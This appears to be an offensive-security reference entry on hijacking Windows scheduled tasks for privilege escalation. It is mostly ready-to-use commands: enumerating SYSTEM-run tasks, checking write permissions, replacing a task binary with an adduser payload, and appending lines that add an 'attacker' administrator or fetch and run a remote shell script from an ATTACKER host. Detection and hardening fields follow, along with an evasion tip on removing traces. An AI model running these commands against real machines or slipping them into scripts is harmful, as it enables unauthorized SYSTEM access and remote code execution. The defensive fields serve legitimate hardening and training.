examples.label: Check write access on the scripts directory
icacls check on a task's binary — look for Users:(F) or (W)
examples.command:
icacls <path\to\task_binary.exe>
# Exploitable if: BUILTIN\Users:(F), Everyone:(F), or <currentuser>:(F/W/M)

examples.label: Swap the task binary with a payload (backup original first)
examples.command:
# Back up original:
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
# Drop payload in its place:
move .\adduser.exe .\Pictures\BackendCacheCleanup.exe
# Wait for the scheduled task to run (or use schtasks /run /tn <name>)

notes:
=== Scheduled Tasks — Enumeration and Script Hijacking ===
Enumerate scheduled tasks to find scripts in writable directories running as SYSTEM.

=== ENUMERATION COMMANDS ===
cmd:
  schtasks /query /fo LIST /v   → all tasks with full details
  schtasks /query /fo LIST /v | findstr "Task To Run\|Run As User\|Status"

PowerShell:
  Get-ScheduledTask | Select TaskName,TaskPath,@{N='Action';E={$_.Actions.Execute}},@{N='RunAs';E={$_.Principal.UserId}} | Where-Object {$_.RunAs -ne 'Users' -and $_.RunAs -ne 'INTERACTIVE'}

File location of task definitions (admin-only read):
  ls C:\Windows\System32\Tasks\ (admin required to read other users' tasks)

=== WHAT TO LOOK FOR ===
Tasks running as:
  SYSTEM = highest priority for script hijacking
  DOMAIN\Administrator = domain admin execution context
  High-privilege service accounts = lateral movement potential

Scripts in writable locations:
  C:\Scripts\ (often created by sysadmins without proper ACLs)
  C:\Tools\ (admin tooling directories)
  %USERPROFILE%\ subdirectories (may be writable by non-admin users)

=== EXPLOITATION — SCRIPT HIJACKING ===
1. Find writable script referenced in scheduled task:
   icacls C:\Scripts\backup.ps1   → check if current user has write access
2. Append malicious command to existing script (non-destructive):
   echo "net localgroup administrators attacker /add" >> C:\Scripts\backup.ps1
   Or: Add-Content C:\Scripts\backup.ps1 "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
3. Wait for scheduled run → malicious command executes as SYSTEM
4. Cleanup: remove appended line after exploitation

=== PATIENCE-BASED TECHNIQUE ===
Scheduled tasks often run overnight, on login, or on specific intervals.
Deploy modification, check back periodically for callback.
Useful in long-term assessments: modify on day 1, check day 2.

=== CHAINING CONTEXT ===
Scheduled task running backup script as SYSTEM → script in C:\Scripts\ writable → inject code → SYSTEM
Task running as domain admin → hijack script → domain admin command execution
Task running DB backup → credentials in script → harvest for lateral movement
MS10-092 (Schelevator) directly abuses Task Scheduler — related kernel exploit path OSCP Ch16 hijacking pattern: find task running as privileged user → icacls on binary/script → full access = replace with adduser.exe → wait for trigger. Key fields: 'Task To Run', 'Run As User', 'Next Run Time'. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).
name: Misc - Scheduled Task Enumeration
description: List scheduled tasks and check permissions on the scripts/binaries they run. A task run by a privileged account whose target is writable by you is an escalation path.

defense.why_it_works: Scheduled tasks run their associated scripts or binaries under the configured user context (often SYSTEM or a privileged account). If the script file or binary is in a directory writable by the current user, replacing or modifying it will execute attacker code under the privileged task's context on the next scheduled run.
defense.prerequisites: Shell access. Scheduled tasks running as SYSTEM or privileged account exist. Write access to the script directory used by a scheduled task.
defense.impact: Arbitrary code execution as SYSTEM or as the privileged task owner on the next task execution, enabling privilege escalation and persistence.
defense.detection: schtasks /query executed by standard user. accesschk on task script directories. File modification events on scheduled task script files. Event 4698 (task registered) or task script modification monitored.
defense.artifacts: Process log: schtasks /query by standard user | accesschk on script paths | File modification: task script modified by non-admin | Event 4702: scheduled task updated
defense.prevention: Audit scheduled task script directory permissions — script directories must not be writable by standard users. Validate scheduled task configurations with CIS Benchmark tools. Sign scheduled task scripts to detect tampering. Monitor task script file integrity.
defense.misconfiguration: Scheduled task script stored in C:\Scripts or C:\Tools with write access for all users. No file integrity monitoring on task script files. Tasks running as SYSTEM without restricting their script directory.
defense.vulnerable_config:
# Find scheduled tasks and check script permissions:
schtasks /query /fo LIST /v | findstr 'Task To Run'
# Task: C:\Scripts\check_updates.ps1

accesschk.exe -w C:\Scripts -v
# BUILTIN\Users: FILE_ALL_ACCESS <- writable!

# Replace script:
echo 'net localgroup Administrators attacker /add' >> C:\Scripts\check_updates.ps1
defense.secure_config:
# Restrict script directory permissions:
icacls C:\Scripts /inheritance:r /grant 'SYSTEM:(OI)(CI)F' /grant 'Administrators:(OI)(CI)F'

# Audit task permissions:
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $action = $task.Actions | Select-Object -First 1
    icacls $action.Execute 2>$null
}

# Enable task modification auditing (Event 4702)
defense.evasion: Touch only what you need; remove any scheduled task/mounted disk/dropped file you create.
